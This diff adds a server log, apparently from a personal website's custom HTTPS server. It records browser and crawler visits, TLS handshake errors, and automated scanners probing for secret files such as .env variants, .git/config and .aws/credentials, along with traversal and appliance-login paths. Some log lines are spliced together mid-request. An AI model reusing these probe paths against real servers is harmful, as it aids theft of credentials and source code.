@@ -1,0 +1,983 @@
+write failed
+: Success
+listening on port 443...
+GET / HTTP/1.1
+Host: lorenzopiombini.com
+Sec-Fetch-Dest: document
+User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.3.1 Mobile/15E148 Safari/604.1
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Referer: https://lorenzopiombini.com/contact
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Accept-Language: en-US,en;q=0.9
+Priority: u=0, i
+Accept-Encoding: gzip, deflate, br
+Connection: keep-alive
+
+GET /pexels-cookiecutter-1148820.jpg HTTP/1.1
+Host: lorenzopiombini.com
+Sec-Fetch-Dest: image
+User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.3.1 Mobile/15E148 Safari/604.1
+Accept: image/webp,image/avif,image/jxl,image/heic,image/heic-sequence,video/*;q=0.8,image/png,image/svg+xml,image/*;q=0.8,*/*;q=0.5
+Referer: https://lorenzopiombini.com/
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: no-cors
+Accept-Language: en-US,en;q=0.9
+Priority: u=5, i
+Accept-Encoding: gzip, deflate, br
+Connection: keep-alive
+
+GET /user-3331257_1280.png HTTP/1.1
+Host: lorenzopiombini.com
+Sec-Fetch-Dest: image
+User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.3.1 Mobile/15E148 Safari/604.1
+Accept: image/webp,image/avif,image/jxl,image/heic,image/heic-sequence,video/*;q=0.8,image/png,image/svg+xml,image/*;q=0.8,*/*;q=0.5
+Referer: https://lorenzopiombini.com/
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: no-cors
+Accept-Language: en-US,en;q=0.9
+Priority: u=5, i
+Accept-Encoding: gzip, deflate, br
+Connection: keep-alive
+
+error SSL nr 1
+GET /memory-8141642_1280.jpg HTTP/1.1
+Host: lorenzopiombini.com
+Sec-Fetch-Dest: image
+User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.3.1 Mobile/15E148 Safari/604.1
+Accept: image/webp,image/avif,image/jxl,image/heic,image/heic-sequence,video/*;q=0.8,image/png,image/svg+xml,image/*;q=0.8,*/*;q=0.5
+Referer: https://lorenzopiombini.com/
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: no-cors
+Accept-Language: en-US,en;q=0.9
+Priority: u=5, i
+Accept-Encoding: gzip, deflate, br
+Connection: keep-alive
+
+GET /user-3331257_1280.png HTTP/1.1
+Host: lorenzopiombini.com
+Sec-Fetch-Dest: image
+User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.3.1 Mobile/15E148 Safari/604.1
+Accept: image/webp,image/avif,image/jxl,image/heic,image/heic-sequence,video/*;q=0.8,image/png,image/svg+xml,image/*;q=0.8,*/*;q=0.5
+Referer: https://lorenzopiombini.com/
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: no-cors
+Accept-Language: en-US,en;q=0.9
+Priority: u=5, i
+Accept-Encoding: gzip, deflate, br
+Connection: keep-alive
+
+GET / HTTP/1.1
+Host: lorenzopiombini.com
+Sec-Fetch-Dest: document
+User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.3.1 Mobile/15E148 Safari/604.1
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Referer: https://lorenzopiombini.com/contact
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Accept-Language: en-US,en;q=0.9
+Priority: u=0, i
+Accept-Encoding: gzip, deflate, br
+Connection: keep-alive
+
+GET /pexels-cookiecutter-1148820.jpg HTTP/1.1
+Host: lorenzopiombini.com
+Sec-Fetch-Dest: image
+User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.3.1 Mobile/15E148 Safari/604.1
+Accept: image/webp,image/avif,image/jxl,image/heic,image/heic-sequence,video/*;q=0.8,image/png,image/svg+xml,image/*;q=0.8,*/*;q=0.5
+Referer: https://lorenzopiombini.com/
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: no-cors
+Accept-Language: en-US,en;q=0.9
+Priority: u=5, i
+Accept-Encoding: gzip, deflate, br
+Connection: keep-alive
+
+GET /memory-8141642_1280.jpg HTTP/1.1
+Host: lorenzopiombini.com
+Sec-Fetch-Dest: image
+User-Agent: Mozilla/5.0 (iPC01E534EFE7A0000:error:0A0000C1:SSL routines:tls_post_process_client_hello:no shared cipher:../ssl/statem/statem_srvr.c:2220:
+handshake failed.
+C01E534EFE7A0000:error:0A000102:SSL routines:tls_early_post_process_client_hello:unsupported protocol:../ssl/statem/statem_srvr.c:1657:
+read failed.
+read failed.
+C01E534EFE7A0000:error:0A0000C1:SSL routines:tls_early_post_process_client_hello:no shared cipher:../ssl/statem/statem_srvr.c:1742:
+handshake failed.
+C01E534EFE7A0000:error:0A00006C:SSL routines:tls_parse_ctos_key_share:bad key share:../ssl/statem/extensions_srvr.c:646:
+handshake failed.
+can't open ./robots.txthone; CPU iPhone OS 18_3_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.3.1 Mobile/15E148 Safari/604.1
+Accept: image/webp,image/avif,image/jxl,image/heic,image/heic-sequence,video/*;q=0.8,image/png,image/svg+xml,image/*;q=0.8,*/*;q=0.5
+Referer: https://lorenzopiombini.com/
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: no-cors
+Accept-Language: en-US,en;q=0.9
+Priority: u=5, i
+Accept-Encoding: gzip, deflate, br
+Connection: keep-alive
+
+GET /user-3331257_1280.png HTTP/1.1
+Host: lorenzopiombini.com
+Sec-Fetch-Dest: image
+User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.3.1 Mobile/15E148 Safari/604.1
+Accept: image/webp,image/avif,image/jxl,image/heic,image/heic-sequence,video/*;q=0.8,image/png,image/svg+xml,image/*;q=0.8,*/*;q=0.5
+Referer: https://lorenzopiombini.com/
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: no-cors
+Accept-Language: en-US,en;q=0.9
+Priority: u=5, i
+Accept-Encoding: gzip, deflate, br
+Connection: keep-alive
+
+GET / HTTP/1.1
+Host: 137.184.91.131
+User-Agent: Mozilla/5.0 (compatible; InternetMeasurement/1.0; +https://internet-measurement.com/)
+Connection: close
+Accept: */*
+Accept-Encoding: gzip
+
+GET / HTTP/1.1
+Host: lorenzopiombini.com
+Sec-Fetch-Dest: document
+User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.3.1 Mobile/15E148 Safari/604.1
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Sec-Fetch-Site: none
+Sec-Fetch-Mode: navigate
+Accept-Language: en-US,en;q=0.9
+Priority: u=0, i
+Accept-Encoding: gzip, deflate, br
+Connection: keep-alive
+
+GET /pexels-cookiecutter-1148820.jpg HTTP/1.1
+Host: lorenzopiombini.com
+Sec-Fetch-Dest: image
+User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.3.1 Mobile/15E148 Safari/604.1
+Accept: image/webp,image/avif,image/jxl,image/heic,image/heic-sequence,video/*;q=0.8,image/png,image/svg+xml,image/*;q=0.8,*/*;q=0.5
+Referer: https://lorenzopiombini.com/
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: no-cors
+Accept-Language: en-US,en;q=0.9
+Priority: u=5, i
+Accept-Encoding: gzip, deflate, br
+Connection: keep-alive
+
+GET /memory-8141642_1280.jpg HTTP/1.1
+Host: lorenzopiombini.com
+Sec-Fetch-Dest: image
+User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.3.1 Mobile/15E148 Safari/604.1
+Accept: image/webp,image/avif,image/jxl,image/heic,image/heic-sequence,video/*;q=0.8,image/png,image/svg+xml,image/*;q=0.8,*/*;q=0.5
+Referer: https://lorenzopiombini.com/
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: no-cors
+Accept-Language: en-US,en;q=0.9
+Priority: u=5, i
+Accept-Encoding: gzip, deflate, br
+Connection: keep-alive
+
+GET /user-3331257_1280.png HTTP/1.1
+Host: lorenzopiombini.com
+Sec-Fetch-Dest: image
+User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.3.1 Mobile/15E148 Safari/604.1
+Accept: image/webp,image/avif,image/jxl,image/heic,image/heic-sequence,video/*;q=0.8,image/png,image/svg+xml,image/*;q=0.8,*/*;q=0.5
+Referer: https://lorenzopiombini.com/
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: no-cors
+Accept-Language: en-US,en;q=0.9
+Priority: u=5, i
+Accept-Encoding: gzip, deflate, br
+Connection: keep-alive
+
+GET /robots.txt HTTP/1.1
+Host: lorenzopiombini.com
+Connection: keep-alive
+Accept: text/plain,text/html,*/*
+User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+Accept-Encoding: gzip, deflate, br
+
+GET / HTTP/1.1
+Host: lorenzopiombini.com
+AMP-Cache-Transform: google;v="1..8"
+Connection: keep-alive
+Accept: text/html,application/xhtml+xml,application/signed-exchange;v=b3,application/xml;q=0.9,*/*;q=0.8
+From: googlebot(at)googlebot.com
+User-Agent: Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.6998.165 Mobile Safari/537.36 (compatible; Goocan't open ./favicon.icoread failed.
+C01E534EFE7A0000:error:0A00009C:SSL routines:ssl3_get_record:http request:../ssl/record/ssl3_record.c:345:
+handshake failed.
+read failed.
+C01E534EFE7A0000:error:0A0000C1:SSL routines:tls_post_process_client_hello:no shared cipher:../ssl/statem/statem_srvr.c:2220:
+read failed.
+C01E534EFE7A0000:error:0A000102:SSL routines:tls_early_post_process_client_hello:unsupported protocol:../ssl/statem/statem_srvr.c:1657:
+read failed.
+read failed.
+read failed.
+can't open ./favicon.icomethod not supported.
+C01E534EFE7A0000:error:0A000102:SSL routines:tls_early_post_process_client_hello:unsupported protocol:../ssl/statem/statem_srvr.c:1657:
+read failed.
+C01E534EFE7A0000:error:0A000102:SSL routines:tls_early_post_process_client_hello:unsupported protocol:../ssl/statem/statem_srvr.c:1657:
+read failed.
+C01E534EFE7A0000:error:0A00018C:SSL routines:tls_early_post_process_client_hello:version too low:../ssl/statem/statem_srvr.c:1657:
+read failed.
+can't open ./favicon.icomethod not supported.
+C01E534EFE7A0000:error:0A00018C:SSL routines:tls_early_post_process_client_hello:version too low:../ssl/statem/statem_srvr.c:1657:
+handshake failed.
+C01E534EFE7A0000:error:0A0000C1:SSL routines:tls_post_process_client_hello:no shared cipher:../ssl/statem/statem_srvr.c:2220:
+read failed.
+read failed.
+C01E534EFE7A0000:error:0A0000C1:SSL routines:tls_post_process_client_hello:no shared cipher:../ssl/statem/statem_srvr.c:2220:
+handshake failed.
+C01E534EFE7A0000:error:0A000102:SSL routines:tls_early_post_process_client_hello:unsupported protocol:../ssl/statem/statem_srvr.c:1657:
+read failed.
+read failed.
+C01E534EFE7A0000:error:0A0000C1:SSL routines:tls_early_post_process_client_hello:no shared cipher:../ssl/statem/statem_srvr.c:1742:
+handshake failed.
+C01E534EFE7A0000:error:0A00006C:SSL routines:tls_parse_ctos_key_share:bad key share:../ssl/statem/extensions_srvr.c:646:
+read failed.
+read failed.
+can't open ./favicon.icocan't open ./api/v2/static/not.foundcan't open ./api/v2/static/not.foundcan't open ./remote/logincheckcan't open ./remote/logincheckcan't open ./fonts/ftnt-icons.woffcan't open ./fonts/ftnt-icons.woffcan't open ./locan't open ./locan't open ./geoserver/web/read failed.
+C01E534EFE7A0000:error:0A0000C1:SSL routines:tls_post_process_client_hello:no shared cipher:../ssl/statem/statem_srvr.c:2220:
+read failed.
+read failed.
+C01E534EFE7A0000:error:0A000102:SSL routines:tls_early_post_process_client_hello:unsupported protocol:../ssl/statem/statem_srvr.c:1657:
+read failed.
+read failed.
+C01E534EFE7A0000:error:0A0000C1:SSL routines:tls_early_post_process_client_hello:no shared cipher:../ssl/statem/statem_srvr.c:1742:
+read failed.
+read failed.
+C01E534EFE7A0000:error:0A00006C:SSL routines:tls_parse_ctos_key_share:bad key share:../ssl/statem/extensions_srvr.c:646:
+read failed.
+read failed.
+read failed.
+C01E534EFE7A0000:error:0A0000C1:SSL routines:tls_post_process_client_hello:no shared cipher:../ssl/statem/statem_srvr.c:2220:
+read failed.
+glebot/2.1; +http://www.google.com/bot.html)
+Accept-Encoding: gzip, deflate, br
+
+GET / HTTP/1.1
+Host: lorenzopiombini.com
+Connection: keep-alive
+Accept: */*
+From: googlebot(at)googlebot.com
+User-Agent: Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+Accept-Encoding: gzip, deflate, br
+
+GET / HTTP/1.1
+Host: lorenzopiombini.com
+Connection: keep-alive
+Accept: */*
+From: googlebot(at)googlebot.com
+User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+Accept-Encoding: gzip, deflate, br
+
+GET /favicon.ico HTTP/1.1
+Host: lorenzopiombini.com
+Connection: keep-alive
+Accept: */*
+From: googlebot(at)googlebot.com
+User-Agent: Googlebot-Image/1.0
+Accept-Encoding: gzip, deflate, br
+
+GET / HTTP/1.1
+Host: 137.184.91.131:443
+
+GET / HTTP/1.1
+Host: 137.184.91.131
+User-Agent: Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)
+Accept: */*
+Accept-Encoding: gzip
+
+GET /favicon.ico HTTP/1.1
+Host: 137.184.91.131
+User-Agent: Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)
+Accept-Encoding: gzip
+Connection: close
+
+PRI * HTTP/2.0
+
+SM
+
+GET /favicon.ico HTTP/1.1
+Host: 137.184.91.131
+User-Agent: Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)
+Accept-Encoding: gzip
+Connection: close
+
+PRI * HTTP/2.0
+
+SM
+
+GET / HTTP/1.1
+Host: 137.184.91.131
+User-Agent: Mozilla/5.0 (X11; OpenBSD amd64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: */*
+Accept-Encoding: gzip
+
+GET /favicon.ico HTTP/1.1
+Host: 137.184.91.131
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 OPR/94.0.0.0 (Edition Yx GX)
+Accept: */*
+Accept-Encoding: gzip
+
+GET / HTTP/1.1
+Host: 137.184.91.131
+User-Agent: Mozilla/5.0 (X11; OpenBSD amd64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: */*
+Accept-Encoding: gzip
+
+GET /api/v2/static/not.found HTTP/1.1
+Host: lorenzopiombini.com
+User-Agent: Mozilla/5.0 (X11; OpenBSD amd64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: */*
+Accept-Encoding: gzip
+
+GET /api/v2/static/not.found HTTP/1.1
+Host: 137.184.91.131
+User-Agent: Mozilla/5.0 (X11; OpenBSD amd64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: */*
+Accept-Encoding: gzip
+
+GET /remote/logincheck HTTP/1.1
+Host: lorenzopiombini.com
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0
+Accept: */*
+Accept-Encoding: gzip
+
+GET /remote/logincheck HTTP/1.1
+Host: 137.184.91.131
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0
+Accept: */*
+Accept-Encoding: gzip
+
+GET /fonts/ftnt-icons.woff HTTP/1.1
+Host: 137.184.91.131
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0
+Accept: */*
+Accept-Encoding: gzip
+
+GET /fonts/ftnt-icons.woff HTTP/1.1
+Host: lorenzopiombini.com
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0
+Accept: */*
+Accept-Encoding: gzip
+
+GET /login?redir=/ng HTTP/1.1
+Host: lorenzopiombini.com
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15
+Accept: */*
+Accept-Encoding: gzip
+
+GET /login?redir=/ng HTTP/1.1
+Host: 137.184.91.131
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15
+Accept: */*
+Accept-Encoding: gzip
+
+GET /geoserver/web/ HTTP/1.1
+Host: 137.184.91.131
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0
+Accept: */*
+Accept-Encoding: gzip
+
+GET /.git/config HTTP/1.1
+Host: lorenzopiombini.com
+User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0
+Accept-Charset: utf-8
+Accept-Encoding: gzip
+Connection: close
+
+GET /robots.txt HTTP/1.1
+Host: 137.184.91.131
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKcan't open ./robots.txtcan't open ./.envC01E534EFE7A0000:error:0A00009C:SSL routines:ssl3_get_record:http request:../ssl/record/ssl3_record.c:345:
+read failed.
+read failed.
+C01E534EFE7A0000:error:0A0000C1:SSL routines:tls_post_process_client_hello:no shared cipher:../ssl/statem/statem_srvr.c:2220:
+read failed.
+read failed.
+C01E534EFE7A0000:error:0A000102:SSL routines:tls_early_post_process_client_hello:unsupported protocol:../ssl/statem/statem_srvr.c:1657:
+read failed.
+read failed.
+C01E534EFE7A0000:error:0A0000C1:SSL routines:tls_early_post_process_client_hello:no shared cipher:../ssl/statem/statem_srvr.c:1742:
+handshake failed.
+C01E534EFE7A0000:error:0A00006C:SSL routines:tls_parse_ctos_key_share:bad key share:../ssl/statem/extensions_srvr.c:646:
+handshake failed.
+can't open ./favicon.icoread failed.
+read failed.
+C01E534EFE7A0000:error:0A0000C1:SSL routines:tls_post_process_client_hello:no shared cipher:../ssl/statem/statem_srvr.c:2220:
+handshake failed.
+C01E534EFE7A0000:error:0A000102:SSL routines:tls_early_post_process_client_hello:unsupported protocol:../ssl/statem/statem_srvr.c:1657:
+read failed.
+C01E534EFE7A0000:error:0A0000C1:SSL routines:tls_early_post_process_client_hello:no shared cipher:../ssl/statem/statem_srvr.c:1742:
+handshake failed.
+C01E534EFE7A0000:error:0A00006C:SSL routines:tls_parse_ctos_key_share:bad key share:../ssl/statem/extensions_srvr.c:646:
+handshake failed.
+can't open ./.env.defaultcan't open ./config/.envcan't open ./.env.testingcan't open ./.env.backupcan't open ./.env.secretcan't open ./.env.distcan't open ./.env.production.localcan't open ./configuration/.envcan't open ./prod/.envcan't open ./settings/.envcan't open ./core/.git/configcan't open ./docker-compose.prod.ymlcan't open ./.env.prodcan't open ./.env.templatecan't open ./project/.git/configcan't open ./api/.git/configcan't open ./cms/.git/configcan't open ./files/.git/configcan't open ./.env.bakcan't open ./app/.git/configit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36
+
+GET /.env HTTP/1.1
+Host: 137.184.91.131
+User-Agent: Mozilla/5.0 Keydrop
+Accept: */*
+Accept-Encoding: gzip
+
+GET / HTTP/1.1
+Host: lorenzopiombini.com
+Accept-Encoding: gzip, deflate
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Language: en-US,en;q=0.9
+Pragma: no-cache
+Cache-Control: no-cache
+User-Agent: Mozilla/5.0 (compatible)
+
+GET /favicon.ico HTTP/1.1
+Host: lorenzopiombini.com
+Accept-Encoding: gzip, deflate
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Language: en-US,en;q=0.9
+Pragma: no-cache
+Cache-Control: no-cache
+User-Agent: Mozilla/5.0 (compatible)
+Referer: https://lorenzopiombini.com/
+
+GET / HTTP/1.1
+Host: 137.184.91.131
+User-Agent: Mozilla/5.0 zgrab/0.x
+Accept: */*
+Accept-Encoding: gzip
+
+GET / HTTP/1.1
+Host: 
+
+HELP
+EHLO leakix.net
+?
+
+GET / HTTP/1.1
+Host: 137.184.91.131
+User-Agent: l9tcpid/v1.1.0
+Connection: close
+
+GET /static../.git/config HTTP/1.1
+Host: 137.184.91.131
+User-Agent: l9explore/1.2.2
+Accept-Encoding: gzip
+Connection: close
+
+GET /.env.default HTTP/1.1
+Host: 137.184.91.131
+User-Agent: l9explore/1.2.2
+Accept-Encoding: gzip
+Connection: close
+
+GET /config/.env HTTP/1.1
+Host: 137.184.91.131
+User-Agent: l9explore/1.2.2
+Accept-Encoding: gzip
+Connection: close
+
+GET /.env.testing HTTP/1.1
+Host: 137.184.91.131
+User-Agent: l9explore/1.2.2
+Accept-Encoding: gzip
+Connection: close
+
+GET /.env.backup HTTP/1.1
+Host: 137.184.91.131
+User-Agent: l9explore/1.2.2
+Accept-Encoding: gzip
+Connection: close
+
+GET /.env.secret HTTP/1.1
+Host: 137.184.91.131
+User-Agent: l9explore/1.2.2
+Accept-Encoding: gzip
+Connection: close
+
+GET /.env.dist HTTP/1.1
+Host: 137.184.91.131
+User-Agent: l9explore/1.2.2
+Accept-Encoding: gzip
+Connection: close
+
+GET /.env.production.local HTTP/1.1
+Host: 137.184.91.131
+User-Agent: l9explore/1.2.2
+Accept-Encoding: gzip
+Connection: close
+
+GET /assets../.git/config HTTP/1.1
+Host: 137.184.91.131
+User-Agent: l9explore/1.2.2
+Accept-Encoding: gzip
+Connection: close
+
+GET /configuration/.env HTTP/1.1
+Host: 137.184.91.131
+User-Agent: l9explore/1.2.2
+Accept-Encoding: gzip
+Connection: close
+
+GET /prod/.env HTTP/1.1
+Host: 137.184.91.131
+User-Agent: l9explore/1.2.2
+Accept-Encoding: gzip
+Connection: close
+
+GET /settings/.env HTTP/1.1
+Host: 137.184.91.131
+User-Agent: l9explore/1.2.2
+Accept-Encoding: gzip
+Connection: close
+
+GET /core/.git/config HTTP/1.1
+Host: 137.184.91.131
+User-Agent: l9explore/1.2.2
+Accept-Encoding: gzip
+Connection: close
+
+GET /docker-compose.prod.yml HTTP/1.1
+Host: 137.184.91.131
+User-Agent: l9explore/1.2.2
+Accept-Encoding: gzip
+Connection: close
+
+GET /.env.prod HTTP/1.1
+Host: 137.184.91.131
+User-Agent: l9explore/1.2.2
+Accept-Encoding: gzip
+Connection: close
+
+GET /.env.template HTTP/1.1
+Host: 137.184.91.131
+User-Agent: l9explore/1.2.2
+Accept-Encoding: gzip
+Connection: close
+
+GET /project/.git/config HTTP/1.1
+Host: 137.184.91.131
+User-Agent: l9explore/1.2.2
+Accept-Encoding: gzip
+Connection: close
+
+GET /api/.git/config HTTP/1.1
+Host: 137.184.91.131
+User-Agent: l9explore/1.2.2
+Accept-Encoding: gzip
+Connection: close
+
+GET /cms/.git/config HTTP/1.1
+Host: 137.184.91.131
+User-Agent: l9explore/1.2.2
+Accept-Encoding: gzip
+Connection: close
+
+GET /files/.git/config HTTP/1.1
+Host: 137.184.91.131
+User-Agent: l9explore/1.2.2
+Accept-Encoding: gzip
+Connection: close
+
+GET /.env.bak HTTP/1.1
+Host: 137.184.91.131
+User-Agent: l9explore/1.2.2
+Accept-Encoding: gzip
+Connection: close
+
+GET /app/.git/config HTTP/1.1
+Host: 137.184.91.131
+User-Agent: l9explore/1.2.2
+Accept-Encoding: gzip
+Connection: close
+
+GET /.git/config HTTP/1.1
+Host: 137.184.91.131
+User-Agent: l9explore/1.2.2
+Accept-Encoding: gzip
+Connection: close
+
+GET /backup/.git/config HTTP/1.1
+Host: 137.184.91.131
+Usecan't open ./backup/.git/configcan't open ./.env.configcan't open ./.env.devcan't open ./api/.envcan't open ./build/.envcan't open ./server/.git/configcan't open ./.env.livecan't open ./.env.staging.localcan't open ./data/.git/configcan't open ./.env.dev.localcan't open ./.env.localcan't open ./.env.sandboxcan't open ./.env.development.localcan't open ./.env.preprodcan't open ./dev/.git/configcan't open ./media/.git/configcan't open ./www/.git/configcan't open ./config/.git/configcan't open ./.env.cican't open ./.env.productioncan't open ./.env_samplecan't open ./.env.savecan't open ./src/.git/configcan't open ./admin/.git/configcan't open ./config.jsoncan't open ./public/.git/configcan't open ./.envcan't open ./.env.stagecan't open ./.env.uatcan't open ./.env.testcan't open ./.aws/credentialsr-Agent: l9explore/1.2.2
+Accept-Encoding: gzip
+Connection: close
+
+GET /.env.config HTTP/1.1
+Host: 137.184.91.131
+User-Agent: l9explore/1.2.2
+Accept-Encoding: gzip
+Connection: close
+
+GET /.env.dev HTTP/1.1
+Host: 137.184.91.131
+User-Agent: l9explore/1.2.2
+Accept-Encoding: gzip
+Connection: close
+
+GET /api/.env HTTP/1.1
+Host: 137.184.91.131
+User-Agent: l9explore/1.2.2
+Accept-Encoding: gzip
+Connection: close
+
+GET /build/.env HTTP/1.1
+Host: 137.184.91.131
+User-Agent: l9explore/1.2.2
+Accept-Encoding: gzip
+Connection: close
+
+GET /server/.git/config HTTP/1.1
+Host: 137.184.91.131
+User-Agent: l9explore/1.2.2
+Accept-Encoding: gzip
+Connection: close
+
+GET /.env.live HTTP/1.1
+Host: 137.184.91.131
+User-Agent: l9explore/1.2.2
+Accept-Encoding: gzip
+Connection: close
+
+GET /.env.staging.local HTTP/1.1
+Host: 137.184.91.131
+User-Agent: l9explore/1.2.2
+Accept-Encoding: gzip
+Connection: close
+
+GET /data/.git/config HTTP/1.1
+Host: 137.184.91.131
+User-Agent: l9explore/1.2.2
+Accept-Encoding: gzip
+Connection: close
+
+GET /.env.dev.local HTTP/1.1
+Host: 137.184.91.131
+User-Agent: l9explore/1.2.2
+Accept-Encoding: gzip
+Connection: close
+
+GET /.env.local HTTP/1.1
+Host: 137.184.91.131
+User-Agent: l9explore/1.2.2
+Accept-Encoding: gzip
+Connection: close
+
+GET /.env.sandbox HTTP/1.1
+Host: 137.184.91.131
+User-Agent: l9explore/1.2.2
+Accept-Encoding: gzip
+Connection: close
+
+GET /.env.development.local HTTP/1.1
+Host: 137.184.91.131
+User-Agent: l9explore/1.2.2
+Accept-Encoding: gzip
+Connection: close
+
+GET /.env.preprod HTTP/1.1
+Host: 137.184.91.131
+User-Agent: l9explore/1.2.2
+Accept-Encoding: gzip
+Connection: close
+
+GET /dev/.git/config HTTP/1.1
+Host: 137.184.91.131
+User-Agent: l9explore/1.2.2
+Accept-Encoding: gzip
+Connection: close
+
+GET /media/.git/config HTTP/1.1
+Host: 137.184.91.131
+User-Agent: l9explore/1.2.2
+Accept-Encoding: gzip
+Connection: close
+
+GET /www/.git/config HTTP/1.1
+Host: 137.184.91.131
+User-Agent: l9explore/1.2.2
+Accept-Encoding: gzip
+Connection: close
+
+GET /config/.git/config HTTP/1.1
+Host: 137.184.91.131
+User-Agent: l9explore/1.2.2
+Accept-Encoding: gzip
+Connection: close
+
+GET /.env.ci HTTP/1.1
+Host: 137.184.91.131
+User-Agent: l9explore/1.2.2
+Accept-Encoding: gzip
+Connection: close
+
+GET /.env.production HTTP/1.1
+Host: 137.184.91.131
+User-Agent: l9explore/1.2.2
+Accept-Encoding: gzip
+Connection: close
+
+GET /.env_sample HTTP/1.1
+Host: 137.184.91.131
+User-Agent: l9explore/1.2.2
+Accept-Encoding: gzip
+Connection: close
+
+GET /.env.save HTTP/1.1
+Host: 137.184.91.131
+User-Agent: l9explore/1.2.2
+Accept-Encoding: gzip
+Connection: close
+
+GET /src/.git/config HTTP/1.1
+Host: 137.184.91.131
+User-Agent: l9explore/1.2.2
+Accept-Encoding: gzip
+Connection: close
+
+GET /admin/.git/config HTTP/1.1
+Host: 137.184.91.131
+User-Agent: l9explore/1.2.2
+Accept-Encoding: gzip
+Connection: close
+
+GET /config.json HTTP/1.1
+Host: 137.184.91.131
+User-Agent: l9explore/1.2.2
+Accept-Encoding: gzip
+Connection: close
+
+GET /public/.git/config HTTP/1.1
+Host: 137.184.91.131
+User-Agent: l9explore/1.2.2
+Accept-Encoding: gzip
+Connection: close
+
+GET /.env HTTP/1.1
+Host: 137.184.91.131
+User-Agent: l9explore/1.2.2
+Accept-Encoding: gzip
+Connection: close
+
+GET /.env.stage HTTP/1.1
+Host: 137.184.91.131
